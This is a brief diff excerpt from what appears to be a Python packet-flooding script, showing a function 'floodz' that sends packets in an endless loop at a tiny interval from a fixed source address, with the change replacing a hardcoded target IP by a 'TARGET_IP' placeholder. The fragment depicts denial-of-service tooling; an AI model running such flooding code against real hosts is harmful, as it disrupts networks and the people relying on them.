@@ -8,5 +8,5 @@ def floodz(source,target):
 	send(pkt,inter=0.0001,loop=1)
 
 source = "10.10.10.10"
-target = "192.168.12.132"
+target = "TARGET_IP"
 floodz(source,target)
